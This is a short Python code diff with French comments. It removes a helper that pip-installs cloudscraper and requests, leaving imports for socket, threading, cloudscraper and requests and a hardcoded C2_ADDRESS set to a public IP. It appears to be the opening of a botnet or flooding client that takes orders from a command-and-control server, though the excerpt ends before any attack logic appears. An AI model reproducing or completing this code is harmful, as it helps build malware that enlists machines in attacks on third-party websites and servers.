@@ -1,16 +1,3 @@
-import subprocess
-
-def installer_modules():
-    # Installation de cloudscraper
-    subprocess.call(['pip', 'install', 'cloudscraper'])
-
-    # Installation de requests
-    subprocess.call(['pip', 'install', 'requests'])
-
-
-if __name__ == "__main__":
-    # Appel de la fonction d'installation des modules
-    installer_modules()
 import socket, threading, time, random, cloudscraper, requests
 
 C2_ADDRESS  = "77.83.242.23"
